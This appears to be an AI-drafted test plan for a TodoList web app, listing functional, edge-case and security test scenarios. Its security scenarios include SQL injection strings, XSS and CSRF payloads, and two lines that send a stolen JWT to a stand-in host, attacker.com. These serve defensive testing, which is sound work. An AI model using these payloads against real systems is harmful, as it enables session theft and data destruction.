# Testing Scenarios — Sample App

> Generated: 2026-06-27 15:22
> Source: `sample-app.md`

---

Perfect! Now I have comprehensive research data. Let me create a detailed testing strategy document based on all the findings.

---

# TodoList App: Comprehensive Testing Strategy

## Executive Summary

Based on research of common failure patterns in task management applications, single-page applications (React), REST APIs, authentication systems, and data synchronization mechanisms, this document provides a structured testing roadmap covering functional, security, edge case, and performance scenarios.

---

## 1. AUTHENTICATION & AUTHORIZATION TESTING

### 1.1 User Registration Flow

#### Scenario: SC-AUTH-001 | Valid User Registration
- **Steps**: 
  1. Navigate to signup page
  2. Enter valid email (e.g., `user@example.com`)
  3. Enter valid password (8+ chars, mixed case, numbers)
  4. Submit registration form
- **Expected Outcome**: 
  - User account created in database
  - Verification email sent
  - Redirect to email verification screen
  - No immediate dashboard access without verification

#### Scenario: SC-AUTH-002 | Email Verification Bypass via Browser Back Button
- **Steps**:
  1. Register new account
  2. See email verification prompt
  3. Click browser back button instead of verifying email
  4. Try to login with unverified email and password
- **Expected Outcome**: 
  - Login should FAIL
  - Server returns 401 error or "Email not verified" message
  - User cannot access dashboard without completing email verification
  - Unverified account state persists in database

#### Scenario: SC-AUTH-003 | SQL Injection in Registration Email Field
- **Steps**:
  1. In email field, enter: `test' OR '1'='1'@example.com`
  2. Enter valid password
  3. Submit form
- **Expected Outcome**: 
  - Application should treat input as literal string
  - No database manipulation occurs
  - Either reject invalid email format or safely store entire string
  - No error messages revealing database structure

#### Scenario: SC-AUTH-004 | Stored XSS in User Profile via Task Description
- **Steps**:
  1. Create a new task with description: `<script>alert('XSS')</script>`
  2. Save task
  3. Reload page and view task
  4. Navigate to other users' shared tasks (if applicable)
- **Expected Outcome**: 
  - Script tags rendered as text, not executed
  - HTML entities encoded: `&lt;script&gt;alert('XSS')&lt;/script&gt;`
  - No alert dialog appears
  - Task description displays safely

#### Scenario: SC-AUTH-005 | XSS in Task Names with Event Handlers
- **Steps**:
  1. Create task with name: `<img src=x onerror="alert('XSS')">`
  2. Save and reload
  3. View task in list
- **Expected Outcome**: 
  - Malicious event handler not triggered
  - Task name displayed safely (escaped)
  - No console errors related to XSS attempts

#### Scenario: SC-AUTH-006 | Weak Password Acceptance
- **Steps**:
  1. Attempt registration with weak passwords:
     - `123456`
     - `password`
     - `qwerty`
     - Single lowercase letter repeated: `aaaaaaaa`
- **Expected Outcome**: 
  - All attempts REJECTED
  - Clear error message indicating requirements
  - Requirements enforced server-side (not just client-side)

#### Scenario: SC-AUTH-007 | Email Already Registered
- **Steps**:
  1. Create account with `test@example.com`
  2. Attempt to register again with same email
- **Expected Outcome**: 
  - Reject with "Email already registered" message
  - Do NOT reveal whether email exists in system (enumerate users)
  - Account takeover prevention

#### Scenario: SC-AUTH-008 | CAPTCHA Bypass Attempt
- **Steps**:
  1. Inspect network requests during registration
  2. Attempt to skip or reuse old CAPTCHA tokens
  3. Simulate rapid registrations (50+ in short time)
- **Expected Outcome**: 
  - CAPTCHA validation fails
  - Repeated tokens rejected
  - Rate limiting blocks spam registrations
  - Max 5 registration attempts per IP per hour

---

### 1.2 Login & JWT Authentication

#### Scenario: SC-AUTH-009 | Valid Login with JWT Token Generation
- **Steps**:
  1. Enter valid email and password
  2. Click login
  3. Inspect localStorage for JWT token
- **Expected Outcome**: 
  - User authenticated successfully
  - JWT token stored in localStorage (or browser storage)
  - Token contains encoded user ID and email
  - Redirect to dashboard
  - Token expiration set (e.g., 24 hours)

#### Scenario: SC-AUTH-010 | XSS Vulnerability - JWT Theft via localStorage
- **Steps**:
  1. Login successfully
  2. Inject malicious script via developer console:
     ```javascript
     document.body.innerHTML += "<script>fetch('https://attacker.com/?token=' + localStorage.getItem('jwtToken'))</script>"
     ```
  3. Check if token is accessible
- **Expected Outcome**: 
  - VULNERABILITY: localStorage is accessible to client-side scripts
  - Token can theoretically be stolen via XSS
  - Mitigation: Use HttpOnly cookies for refresh tokens instead
  - SHORT-TERM FIX: Implement Content Security Policy (CSP) to prevent inline scripts
  - LONG-TERM FIX: Refactor to use secure cookie storage

#### Scenario: SC-AUTH-011 | Invalid Credentials
- **Steps**:
  1. Enter valid email with wrong password
  2. Submit form
- **Expected Outcome**: 
  - Generic error: "Invalid email or password"
  - NO message revealing which field is incorrect (prevents user enumeration)
  - Attempt logged for brute force detection
  - No redirect to dashboard

#### Scenario: SC-AUTH-012 | Brute Force Protection on Login
- **Steps**:
  1. Attempt login with correct email, wrong password: 10 times rapidly
  2. Observe responses
- **Expected Outcome**: 
  - After 5 failed attempts: Return HTTP 429 "Too Many Requests"
  - Account temporarily locked (5-15 minutes)
  - IP address rate-limited
  - User notified of lockout
  - Unlock sent via email link

#### Scenario: SC-AUTH-013 | JWT Token Manipulation - Signature Bypass
- **Steps**:
  1. Decode JWT from localStorage: `eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoi...`
  2. Modify payload: Change `"user_id": 1` to `"user_id": 2`
  3. Re-encode and replace in localStorage
  4. Make API request with modified token
- **Expected Outcome**: 
  - API rejects request (HTTP 401 or 403)
  - Server validates JWT signature before accepting
  - Modified tokens cannot access different user's data
  - Suspicious activity logged

#### Scenario: SC-AUTH-014 | Expired Token Handling
- **Steps**:
  1. Login and capture JWT token
  2. Wait for token expiration (or mock time forward in tests)
  3. Make API request with expired token
- **Expected Outcome**: 
  - API returns HTTP 401 "Unauthorized - Token Expired"
  - User automatically redirected to login page
  - No sensitive data returned
  - Clear message: "Session expired, please login again"

#### Scenario: SC-AUTH-015 | CSRF Attack Simulation (Form-based)
- **Steps**:
  1. Create external HTML page with form targeting todo API:
     ```html
     <form action="https://todoapp.com/api/tasks" method="POST">
       <input name="name" value="Malicious Task">
     </form>
     <script>document.forms[0].submit();</script>
     ```
  2. Trick logged-in user into visiting this page
- **Expected Outcome**: 
  - Request rejected or requires CSRF token validation
  - If using SPA, POST/PUT/DELETE requests should include CSRF token
  - Same-Origin Policy prevents cross-origin requests by default
  - OR explicitly reject requests lacking CSRF token

---

### 1.3 Password Reset & Account Recovery

#### Scenario: SC-AUTH-016 | Password Reset - Valid Flow
- **Steps**:
  1. Click "Forgot Password"
  2. Enter registered email
  3. Check email for reset link
  4. Click link and set new password
  5. Login with new password
- **Expected Outcome**: 
  - Reset email sent within 2 minutes
  - Reset link valid for 30 minutes only
  - Old password no longer works
  - New password set successfully
  - Redirect to login

#### Scenario: SC-AUTH-017 | Password Reset Token Brute Force
- **Steps**:
  1. Request password reset for target email
  2. Attempt to guess reset token by sending:
     - `/api/password-reset/000001`
     - `/api/password-reset/000002`
     - (and so on, 100+ attempts)
- **Expected Outcome**: 
  - After 5 failed attempts per IP: HTTP 429 "Too Many Requests"
  - Rate limiting: Max 5 reset attempts per email per hour
  - Tokens are cryptographically random (256+ bit entropy)
  - Cannot brute force valid tokens
  - Suspicious activity logged and monitored

#### Scenario: SC-AUTH-018 | Password Reset - Token Expiration
- **Steps**:
  1. Request password reset
  2. Wait 31+ minutes without clicking link
  3. Try to use reset link
- **Expected Outcome**: 
  - Link expired error displayed
  - Token no longer valid in database
  - User must request new reset link
  - Security: Prevents old intercepted tokens from being used

#### Scenario: SC-AUTH-019 | Multiple Password Reset Requests
- **Steps**:
  1. Request password reset 5 times in 1 minute
  2. Check email inbox (or spam folder)
- **Expected Outcome**: 
  - 6th attempt rejected with HTTP 429
  - Only 1-2 valid reset emails sent (to prevent spam/DOS)
  - Old reset links invalidated when new one generated
  - Rate limit: Max 3 requests per email per 24 hours

#### Scenario: SC-AUTH-020 | Password Reset - Email Enumeration
- **Steps**:
  1. Request reset for: `admin@example.com`
  2. Request reset for: `nonexistent@example.com`
  3. Compare responses
- **Expected Outcome**: 
  - SAME response message: "If email exists, reset link will be sent"
  - NO difference in response time (prevent timing attacks)
  - NO indication whether email is registered
  - Both return HTTP 200 with same message

---

### 1.4 Session Management

#### Scenario: SC-AUTH-021 | Multiple Active Sessions
- **Steps**:
  1. Login on Device A
  2. Login on Device B with same account
  3. Create task on Device A
  4. Check if visible on Device B immediately
- **Expected Outcome**: 
  - Both sessions remain active (allow multi-device access)
  - Tokens are independent
  - Real-time sync works across devices
  - Each device can act independently

#### Scenario: SC-AUTH-022 | Logout - Token Invalidation
- **Steps**:
  1. Login and capture JWT token
  2. Click logout
  3. Try to use old token to access protected endpoint
- **Expected Outcome**: 
  - Token removed from localStorage on client
  - API rejects old token (ideally blacklisted server-side)
  - Redirect to login page
  - Protected endpoints return HTTP 401

#### Scenario: SC-AUTH-023 | Session Timeout - Inactivity
- **Steps**:
  1. Login
  2. Leave app idle for 31 minutes (or trigger with mock timer)
  3. Attempt to create a new task
- **Expected Outcome**: 
  - User silently logged out after 30 minutes inactivity
  - API returns HTTP 401
  - Redirect to login or prompt to re-authenticate
  - User data unsaved (if applicable)

#### Scenario: SC-AUTH-024 | LocalStorage XSS Risk - Complete Attack Vector
- **Steps**:
  1. Login to app
  2. Navigate to a page with reflected XSS vulnerability (e.g., search):
     - `/search?q=<img src=x onerror="fetch('http://attacker.com/steal?token=' + localStorage.getItem('jwtToken'))">`
  3. If XSS not prevented, attacker's server receives JWT token
- **Expected Outcome**: 
  - XSS vulnerability prevented (covered in SC-AUTH-004, SC-AUTH-005)
  - If test fails, token is exposed
  - Recommendation: Use HttpOnly cookies + secure cookie flags (SameSite, Secure)

---

## 2. FUNCTIONAL TESTING - TASK MANAGEMENT

### 2.1 Task CRUD Operations

#### Scenario: SC-FUNC-001 | Create Task - Valid Input
- **Steps**:
  1. Login
  2. Click "Add Task"
  3. Enter name: `Buy groceries`
  4. Set priority: `Medium`
  5. Set due date: `2025-12-31`
  6. Click "Save"
- **Expected Outcome**: 
  - Task created and visible in task list
  - Task appears with correct name, priority, due date
  - Timestamp recorded (created_at)
  - Task marked as "incomplete" by default
  - Local UI updates immediately (optimistic update)

#### Scenario: SC-FUNC-002 | Create Task - Empty Name
- **Steps**:
  1. Click "Add Task"
  2. Leave name field empty
  3. Set other fields
  4. Click "Save"
- **Expected Outcome**: 
  - Form validation prevents submission
  - Client-side error: "Task name is required"
  - Server-side validation also enforces this
  - No task created

#### Scenario: SC-FUNC-003 | Create Task - Very Long Name (Edge Case)
- **Steps**:
  1. Create task with 5000+ character name
  2. Submit form
- **Expected Outcome**: 
  - Either truncated to max length (e.g., 255 chars) with warning
  - OR rejected with error: "Task name exceeds maximum length"
  - Server enforces max length validation
  - Database field has appropriate character limit

#### Scenario: SC-FUNC-004 | Create Task - Special Characters in Name
- **Steps**:
  1. Create task with name: `Test™ © ® → ← ↑ ↓ 你好 🎉 Ñoño`
  2. Save and reload page
- **Expected Outcome**: 
  - All Unicode characters preserved and displayed correctly
  - Database charset supports UTF-8
  - No character corruption on reload
  - Special chars don't break task name display

#### Scenario: SC-FUNC-005 | Create Task - Optional Description
- **Steps**:
  1. Create task with name and description:
     - Description: `Remember to buy organic milk and whole grain bread`
  2. Save
  3. Edit task and verify description appears
- **Expected Outcome**: 
  - Description stored correctly
  - Description field optional (can be empty)
  - XSS vulnerability tests apply here (SC-AUTH-004)
  - Description HTML-encoded when displayed

#### Scenario: SC-FUNC-006 | Edit Task - Update All Fields
- **Steps**:
  1. Create task: "Old Task", priority "Low", due date "2025-01-01"
  2. Click edit
  3. Change to: "New Task", priority "High", due date "2026-01-01"
  4. Save
- **Expected Outcome**: 
  - All fields updated in database
  - UI reflects changes immediately
  - Timestamp updated (updated_at)
  - Task visible in dashboard with new values
  - No duplicate tasks created

#### Scenario: SC-FUNC-007 | Edit Task - Partial Update
- **Steps**:
  1. Create task with name, priority, due date, description
  2. Edit: Change ONLY the priority
  3. Save without modifying other fields
- **Expected Outcome**: 
  - Only priority changed
  - Other fields remain unchanged
  - updated_at timestamp changes
  - No data loss in other fields

#### Scenario: SC-FUNC-008 | Delete Task - Soft Delete (Recommended)
- **Steps**:
  1. Create task "Temporary Task"
  2. Click "Delete"
  3. Confirm deletion
- **Expected Outcome**: 
  - Task removed from view immediately
  - No "Undo" button appears for X seconds (optional)
  - Task marked as deleted in database (soft delete)
  - Can be recovered if needed (backup)
  - Or hard deleted after retention period (e.g., 30 days)

#### Scenario: SC-FUNC-009 | Delete Task - Authorization Check
- **Steps**:
  1. Login as User A
  2. Create task "User A Task"
  3. Logout and login as User B
  4. Try to delete User A's task via API:
     - `DELETE /api/tasks/USER_A_TASK_ID`
- **Expected Outcome**: 
  - Request rejected with HTTP 403 "Forbidden"
  - Task remains in User A's account
  - No cross-user data manipulation
  - Logging records unauthorized attempt

#### Scenario: SC-FUNC-010 | Bulk Delete Tasks
- **Steps**:
  1. Create 10 tasks
  2. Select multiple tasks (checkboxes)
  3. Click "Delete Selected"
  4. Confirm
- **Expected Outcome**: 
  - All selected tasks deleted
  - Task count decreases correctly
  - API handles bulk operations safely
  - No tasks partially deleted (atomic transaction)

---

### 2.2 Task Status & Completion

#### Scenario: SC-FUNC-011 | Mark Task Complete
- **Steps**:
  1. Create task "Buy Milk"
  2. Click checkbox to mark complete
- **Expected Outcome**: 
  - Task marked as "complete" (is_completed = true)
  - Visual indication: strikethrough, grayed out, or checkmark
  - Timestamp recorded: completed_at
  - Task moves to "Completed" section (if applicable)
  - Refresh page: Task remains complete

#### Scenario: SC-FUNC-012 | Mark Task Incomplete
- **Steps**:
  1. Mark task as complete
  2. Click again to unmark
- **Expected Outcome**: 
  - Task status reverted to incomplete
  - completed_at timestamp cleared/nullified
  - Visual indicator removed
  - Task reappears in active tasks
  - Can be toggled multiple times

#### Scenario: SC-FUNC-013 | Complete Status Persistence
- **Steps**:
  1. Create 5 tasks, mark 2 as complete
  2. Logout
  3. Login again
- **Expected Outcome**: 
  - Completed tasks retain their status
  - Same 2 tasks still marked complete
  - Dashboard shows correct counts
  - No status reset on page reload

---

### 2.3 Priority Levels

#### Scenario: SC-FUNC-014 | Set Priority - All Levels
- **Steps**:
  1. Create task and set priority: "Low"
  2. Edit and change to: "Medium"
  3. Edit and change to: "High"
  4. Verify each saved correctly
- **Expected Outcome**: 
  - All priority levels accepted and stored
  - Correct level displayed in UI
  - Default priority applied if not specified (e.g., "Medium")
  - Persists across sessions

#### Scenario: SC-FUNC-015 | Filter by Priority
- **Steps**:
  1. Create 3 tasks: Low, Medium, High
  2. Click filter: "Show High Priority Only"
- **Expected Outcome**: 
  - Only high-priority task visible
  - Task count shows "1 of 3"
  - Other priorities hidden
  - Filter persists until changed
  - "Clear Filters" button restores all

#### Scenario: SC-FUNC-016 | Sort by Priority
- **Steps**:
  1. Create tasks with mixed priorities
  2. Click "Sort by Priority"
- **Expected Outcome**: 
  - Tasks sorted: High → Medium → Low (or configurable)
  - Sort order toggleable (ascending/descending)
  - Sort applied immediately
  - Sort preference remembered (localStorage or user settings)

---

### 2.4 Due Dates & Scheduling

#### Scenario: SC-FUNC-017 | Set Due Date - Valid Date
- **Steps**:
  1. Create task
  2. Click date picker
  3. Select date: `2026-06-15`
  4. Save
- **Expected Outcome**: 
  - Due date stored as ISO8601 UTC: `2026-06-15T00:00:00Z`
  - Date picker shows selected date
  - Task displays due date correctly
  - No timezone confusion (SC-EDGE-002 covers this)

#### Scenario: SC-FUNC-018 | Due Date - Today vs. Future vs. Past
- **Steps**:
  1. Create 3 tasks with due dates:
     - Today: `2025-01-15` (if today is 2025-01-15)
     - Future: `2026-12-31`
     - Past: `2024-01-01`
  2. View dashboard
- **Expected Outcome**: 
  - Visual indicators for overdue tasks (red)
  - Today's tasks highlighted (yellow/orange)
  - Future tasks normal (green)
  - "Overdue" filter works correctly
  - Sorting by due date orders correctly

#### Scenario: SC-FUNC-019 | No Due Date Set
- **Steps**:
  1. Create task without setting due date
  2. View task
- **Expected Outcome**: 
  - Task displays: "No due date" or empty field
  - Task doesn't appear in "Due Today" filter
  - Task appears in "All Tasks" filter
  - Can edit and add due date later

#### Scenario: SC-FUNC-020 | Due Date Timezone Handling (CRITICAL EDGE CASE)
- **Steps**:
  1. User in Tokyo timezone creates task due: `2025-12-31 11:59 PM` (JST = UTC+9)
  2. User travels to New York (UTC-5) and logs in
  3. Check what due date/time is displayed
- **Expected Outcome**: 
  - Due date display adjusted to local timezone automatically
  - In Tokyo: Shows `2025-12-31 11:59 PM`
  - In New York: Shows `2025-12-31 7:59 AM` (same moment in time)
  - Server stores as UTC internally
  - No data loss or corruption
  - **See SC-EDGE-002 for detailed timezone testing**

#### Scenario: SC-FUNC-021 | Due Date - Invalid Input
- **Steps**:
  1. Try to set due date: `2025-13-45` (invalid month/day)
  2. Try: `invalid-date-string`
  3. Try: `-1000` (negative number)
- **Expected Outcome**: 
  - Client-side validation rejects invalid dates
  - Date picker prevents invalid selections
  - Server-side validation also enforces
  - Error message: "Please select a valid date"

#### Scenario: SC-FUNC-022 | Due Date - Past Date Selection
- **Steps**:
  1. Today is `2025-01-15`
  2. Try to set due date: `2024-12-31`
- **Expected Outcome**: 
  - Either prevent past date selection (disable in date picker)
  - OR allow with warning: "Due date is in the past"
  - If allowed, task appears in "Overdue" section
  - Depends on app requirements (allow backdating if valid use case)

---

### 2.5 Task Lists & Categories

#### Scenario: SC-FUNC-023 | Create List
- **Steps**:
  1. Click "New List"
  2. Enter name: `Shopping`
  3. Save
- **Expected Outcome**: 
  - New list created and visible in sidebar
  - Tasks can be added to this list
  - List persists after reload
  - User can have multiple lists

#### Scenario: SC-FUNC-024 | Rename List
- **Steps**:
  1. Right-click on list name (or click edit)
  2. Change: `Shopping` → `Groceries`
  3. Save
- **Expected Outcome**: 
  - List renamed
  - Tasks within list unaffected
  - Rename persists
  - No tasks lost

#### Scenario: SC-FUNC-025 | Delete List - With Tasks
- **Steps**:
  1. Create list `Work`
  2. Add 5 tasks to it
  3. Delete list
- **Expected Outcome**: 
  - Prompt appears: "Delete list and all tasks? This cannot be undone."
  - Option to move tasks to another list instead
  - If confirmed: List and all tasks deleted
  - No orphaned tasks

#### Scenario: SC-FUNC-026 | Assign Task to List
- **Steps**:
  1. Create task
  2. Click task → Edit
  3. Select list: `Shopping`
  4. Save
- **Expected Outcome**: 
  - Task appears in `Shopping` list
  - Task also visible in "All Tasks"
  - Task assignment persists
  - Can move task to different list

#### Scenario: SC-FUNC-027 | View Tasks by List Filter
- **Steps**:
  1. Create 2 lists: `Work`, `Personal`
  2. Add tasks to each
  3. Click on `Work` list
- **Expected Outcome**: 
  - Only `Work` tasks visible
  - `Personal` tasks hidden
  - Task count shows: `3 of 7` (example)
  - Can switch lists quickly
  - "All Tasks" shows everything

---

### 2.6 Recurring Tasks

#### Scenario: SC-FUNC-028 | Create Daily Recurring Task
- **Steps**:
  1. Create task: `Drink water`
  2. Set recurrence: `Daily`
  3. Save
- **Expected Outcome**: 
  - Task marked as recurring
  - Next occurrence generated for tomorrow
  - When marked complete today, new instance created tomorrow
  - Persists indefinitely (or until end date)

#### Scenario: SC-FUNC-029 | Create Weekly Recurring Task
- **Steps**:
  1. Create task: `Team Meeting`
  2. Set recurrence: `Every Monday`
  3. Save
- **Expected Outcome**: 
  - Task appears every Monday
  - On Monday, mark complete → creates instance for next Monday
  - Recurrence persists week after week
  - Dashboard shows "1 of 5 this month" (example)

#### Scenario: SC-FUNC-030 | Create Monthly Recurring Task
- **Steps**:
  1. Create task: `Pay rent`
  2. Set recurrence: `Monthly on the 1st`
  3. Save today: `2025-01-15`
- **Expected Outcome**: 
  - First instance: `2025-02-01`
  - Next: `2025-03-01`, `2025-04-01`, etc.
  - Mark complete → generates next month's instance
  - Indefinite recurrence (or until end date)

#### Scenario: SC-FUNC-031 | Monthly Recurrence - Non-existent Date Edge Case (CRITICAL)
- **Steps**:
  1. Create recurring task on `2025-01-31` with recurrence: `Monthly on the 31st`
  2. Note what happens in February (which has only 28 days in 2025)
- **Expected Outcome**: 
  - Task skips February 31 (doesn't exist)
  - Next instance: `2025-03-31` (March has 31 days)
  - OR: Moves to last day of month: `2025-02-28`
  - App handles gracefully without errors
  - See **SC-EDGE-006** for detailed edge case testing

#### Scenario: SC-FUNC-032 | Recurring Task with End Date
- **Steps**:
  1. Create daily task: `Review metrics`
  2. Set end date: `2025-12-31`
  3. Save
- **Expected Outcome**: 
  - Last instance generated on `2025-12-31`
  - No instances after end date
  - Dashboard shows: `180 of 180 remaining` (example)
  - After end date, no new instances created

#### Scenario: SC-FUNC-033 | Edit Single Recurring Instance
- **Steps**:
  1. Create daily task
  2. Click on today's instance
  3. Edit: Change due time from 9 AM to 5 PM
  4. Select: "Edit this occurrence only"
- **Expected Outcome**: 
  - Only today's instance changed
  - Tomorrow's instance retains original time
  - Recurring pattern continues unchanged
  - If "Edit all in series" selected, all affected

#### Scenario: SC-FUNC-034 | Skip/Snooze Recurring Task
- **Steps**:
  1. Daily task appears: "Take medicine"
  2. Click "Snooze for 1 day"
- **Expected Outcome**: 
  - Task reappears tomorrow
  - Today's instance skipped/hidden
  - Recurring pattern continues
  - Snooze limit (e.g., max 3 per day) if desired

#### Scenario: SC-FUNC-035 | Delete Recurring Task Series
- **Steps**:
  1. Delete recurring task
  2. Choose: "Delete all recurring instances" vs. "Delete only this occurrence"
- **Expected Outcome**: 
  - If "Delete all": All instances removed, recurrence ends
  - If "Delete only this": Other instances remain
  - Confirmation dialog prevents accidental bulk deletion
  - Action logged

---

### 2.7 Search & Filter

#### Scenario: SC-FUNC-036 | Search by Keyword
- **Steps**:
  1. Create tasks: `Buy milk`, `Buy bread`, `Sell books`
  2. Search: `buy`
- **Expected Outcome**: 
  - 2 tasks returned: `Buy milk`, `Buy bread`
  - Search case-insensitive
  - Searches both task name and description
  - Highlights matching text
  - "Clear search" button resets

#### Scenario: SC-FUNC-037 | Filter by Status - Complete
- **Steps**:
  1. Create 5 tasks, mark 2 complete
  2. Filter: "Show completed only"
- **Expected Outcome**: 
  - Only 2 completed tasks visible
  - Count shows: `2 of 5 completed`
  - Other filters can be combined
  - Toggle shows: "Active" (3 tasks), "Completed" (2 tasks)

#### Scenario: SC-FUNC-038 | Filter by Status - Incomplete
- **Steps**:
  1. Filter: "Show incomplete only"
- **Expected Outcome**: 
  - Only uncompleted tasks visible
  - Completed tasks hidden
  - Task count accurate

#### Scenario: SC-FUNC-039 | Filter by Priority - Multiple Selections
- **Steps**:
  1. Create tasks with mixed priorities
  2. Select filter: "High AND Medium" (checkbox selection)
- **Expected Outcome**: 
  - Only High and Medium priority tasks shown
  - Low priority hidden
  - Filters combine with AND logic
  - Clear button resets all filters

#### Scenario: SC-FUNC-040 | Filter by Due Date - Overdue
- **Steps**:
  1. Create 3 tasks: 1 overdue, 1 due today, 1 due tomorrow
  2. Filter: "Show overdue"
- **Expected Outcome**: 
  - Only overdue task shown
  - Red indicator on overdue task
  - Count accurate

#### Scenario: SC-FUNC-041 | Filter by Due Date - Due Today
- **Steps**:
  1. Filter: "Due today"
- **Expected Outcome**: 
  - Only today's tasks shown
  - Count accurate
  - Other days' tasks hidden

#### Scenario: SC-FUNC-042 | Filter by Due Date - Due This Week
- **Steps**:
  1. Filter: "Due this week"
- **Expected Outcome**: 
  - Tasks due Mon-Sun of current week shown
  - Future weeks hidden
  - Respects week start preference (Mon or Sun)

#### Scenario: SC-FUNC-043 | Filter by List
- **Steps**:
  1. Create 2 lists: `Work`, `Personal`
  2. Add tasks to each
  3. Filter: "List = Work"
- **Expected Outcome**: 
  - Only Work tasks shown
  - Personal tasks hidden
  - Can combine with other filters

#### Scenario: SC-FUNC-044 | Combined Filters - AND Logic
- **Steps**:
  1. Filter by: Priority = "High" AND Status = "Incomplete" AND List = "Work"
- **Expected Outcome**: 
  - Only tasks matching ALL criteria shown
  - Count accurate
  - Each filter independently toggleable
  - Clear button resets all

#### Scenario: SC-FUNC-045 | Search + Filter Combination
- **Steps**:
  1. Search: `meeting`
  2. Apply filter: Priority = "High"
- **Expected Outcome**: 
  - Results contain "meeting" keyword
  - AND priority is High
  - Narrowed results displayed
  - Both search and filters active simultaneously

#### Scenario: SC-FUNC-046 | Filter Persistence
- **Steps**:
  1. Apply complex filters
  2. Navigate away and back to app
- **Expected Outcome**: 
  - Filters persist in localStorage or user settings
  - OR filters reset on page reload (depends on design)
  - Behavior documented and consistent
  - No data loss from filter application

---

### 2.8 Sorting

#### Scenario: SC-FUNC-047 | Sort by Due Date - Ascending
- **Steps**:
  1. Create tasks with mixed due dates
  2. Click "Sort by Due Date"
- **Expected Outcome**: 
  - Tasks ordered: Earliest due → Latest due
  - Overdue tasks appear first
  - No due date tasks last
  - Toggle to descending available

#### Scenario: SC-FUNC-048 | Sort by Priority - High to Low
- **Steps**:
  1. Click "Sort by Priority"
- **Expected Outcome**: 
  - Tasks ordered: High → Medium → Low
  - Same priority: Maintain creation order
  - Toggle to reverse order available

#### Scenario: SC-FUNC-049 | Sort by Creation Date - Newest First
- **Steps**:
  1. Click "Sort by Created At" (or "Newest First")
- **Expected Outcome**: 
  - Recently created tasks at top
  - Oldest tasks at bottom
  - Timestamp compared accurately
  - Toggle to "Oldest First" available

#### Scenario: SC-FUNC-050 | Sort Persistence
- **Steps**:
  1. Apply sort: "Due Date Ascending"
  2. Refresh page
- **Expected Outcome**: 
  - Sort order persists
  - OR resets to default (depends on design)
  - Behavior consistent and documented

---

## 3. EDGE CASES & BOUNDARY CONDITIONS

### 3.1 Data & Input Boundaries

#### Scenario: SC-EDGE-001 | Task Name - Maximum Length
- **Steps**:
  1. Create task with name: 10,000 character string
  2. Attempt to save
- **Expected Outcome**: 
  - Database field has max length (e.g., 255 chars)
  - Client validation truncates or rejects before save
  - Server-side validation enforces hard limit
  - Error message: "Task name exceeds 255 characters"
  - OR auto-truncate with warning

#### Scenario: SC-EDGE-002 | Timezone Handling - DST Transition (CRITICAL)
- **Steps**:
  1. Set user timezone to US Eastern
  2. Create task due on 2025-03-09 (DST starts, 2 AM → 3 AM)
  3. Set due time: 2:30 AM EST
  4. Check what's stored
  5. After clock changes, check time displays
- **Expected Outcome**: 
  - Server stores as UTC: `2025-03-09T07:30:00Z` (2:30 AM EST = 7:30 AM UTC)
  - Client displays: `2:30 AM EDT` (after DST, same absolute time)
  - No off-by-one hour errors
  - Calculation accounts for DST rules
  - Test for multiple timezones with different DST rules

#### Scenario: SC-EDGE-003 | Leap Year Handling
- **Steps**:
  1. Create recurring task on 2024-02-29 (leap day)
  2. Set recurrence: Monthly
  3. Check occurrences in non-leap years (2025, 2026)
- **Expected Outcome**: 
  - 2025-03-29 (March 29, since Feb 29 doesn't exist)
  - OR 2025-02-28 (last day of February)
  - Consistent handling of edge date
  - No crashes or data corruption
  - See SC-FUNC-031 for similar case

#### Scenario: SC-EDGE-004 | Large Dataset - 10,000+ Tasks
- **Steps**:
  1. Create/import 10,000 tasks via API
  2. Load dashboard
  3. Apply filters
  4. Search for specific task
- **Expected Outcome**: 
  - Dashboard loads within 3 seconds
  - No memory leaks visible
  - Pagination or infinite scroll works smoothly
  - Search performance acceptable
  - Filters apply without lag
  - Network requests optimized (not fetching all 10k tasks at once)

#### Scenario: SC-EDGE-005 | Database Null/Empty Values
- **Steps**:
  1. Create task with minimal data: name only
  2. Leave optional fields (description, due date) empty
  3. Query database directly (if accessible)
- **Expected Outcome**: 
  - Optional fields are NULL or empty string (not `undefined`)
  - API doesn't include undefined fields in response
  - Client handles null values gracefully
  - No "null" strings displayed in UI

#### Scenario: SC-EDGE-006 | Numeric Fields - Boundary Values
- **Steps**:
  1. If priority is numeric (0-2 for Low-High), try: -1, 3, 999
  2. If task ID is numeric, try manipulating IDs: 0, -1, 9999999
- **Expected Outcome**: 
  - Invalid priorities rejected (SC-FUNC-014)
  - Invalid task IDs return HTTP 404
  - No unintended access or data leakage
  - Server validates all numeric inputs

#### Scenario: SC-EDGE-007 | Unicode & Emoji in Task Names
- **Steps**:
  1. Create tasks with:
     - Emoji: `📅 Task with emoji`
     - Chinese: `任务名称`
     - Arabic: `مهمة عربية`
     - Right-to-left (RTL) text
     - Zero-width characters: `Task​Name` (with invisible char)
- **Expected Outcome**: 
  - All characters preserved correctly
  - Database charset is UTF-8
  - No character corruption on save/load
  - No XSS vectors from special chars
  - RTL text displays correctly (requires CSS `direction: rtl`)
  - Zero-width chars handled (stripped or preserved based on design)

#### Scenario: SC-EDGE-008 | Concurrent Task Edits - Race Condition
- **Steps**:
  1. Open same task in 2 browser windows (User A and User B)
  2. User A edits: name → "New Name", clicks Save
  3. User B edits: priority → "High", clicks Save
  4. Check final state
- **Expected Outcome**: 
  - Last write wins (simple approach)
  - OR optimistic locking prevents conflicts (complex but better)
  - Both users notified of conflict
  - UI shows: "This task was modified by another user"
  - User B's unsaved changes discarded with warning

#### Scenario: SC-EDGE-009 | Negative and Zero Values
- **Steps**:
  1. If task has a weight/priority number field: Try 0, -1, -100
  2. If due date stored as Unix timestamp: Try 0, negative values
  3. If task count shown: Display -1 tasks (impossible value)
- **Expected Outcome**: 
  - Invalid values rejected by server validation
  - Positive integer constraints enforced
  - Error: "Value must be positive"
  - No database corruption from invalid values

#### Scenario: SC-EDGE-010 | SQL Injection - Advanced Attempts
- **Steps**:
  1. Task name: `'; DROP TABLE tasks; --`
  2. Task name: `admin' OR '1'='1`
  3. Task name: `task" UNION SELECT * FROM users --`
  4. Description: `<img src=x:alert(alt)>`
- **Expected Outcome**: 
  - Parameterized queries prevent SQL injection
  - Strings treated as literal data, not SQL code
  - Task created with literal string as name
  - No database tables dropped
  - No unauthorized data exposed

#### Scenario: SC-EDGE-011 | HTML/JavaScript Injection in Description
- **Steps**:
  1. Description: `<script>alert('XSS')</script>`
  2. Description: `<iframe src="https://evil.com"></iframe>`
  3. Description: `<a href="javascript:alert('XSS')">Click me</a>`
- **Expected Outcome**: 
  - HTML tags escaped/encoded when displayed
  - No scripts executed
  - Safe HTML subset allowed if applicable (e.g., `<b>`, `<i>`, `<br>`)
  - Dangerous tags stripped
